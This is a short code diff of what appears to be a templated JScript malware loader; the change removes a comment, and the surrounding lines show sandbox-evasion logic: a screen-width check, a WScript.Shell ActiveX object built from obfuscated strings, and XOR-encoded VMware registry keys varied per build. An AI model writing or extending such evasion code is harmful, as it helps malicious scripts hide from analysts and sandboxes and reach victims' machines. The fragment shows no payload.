@@ -41,7 +41,6 @@ function {{ v.fn_sandbox }}() {
             if (d.ScreenWidth && d.ScreenWidth < 800) return true;
         }
     } catch(e2) {}
-    // VM registry key checks (XOR-encoded per build)
     try {
         var sh = new ActiveXObject({{ v.fn_build_str }}([{{ v.jsc_wscript_shell }}]));
         var _vmr=[{{ jsc_vmware_reg_enc }}],_vmx={{ jsc_vmware_reg_xk }};
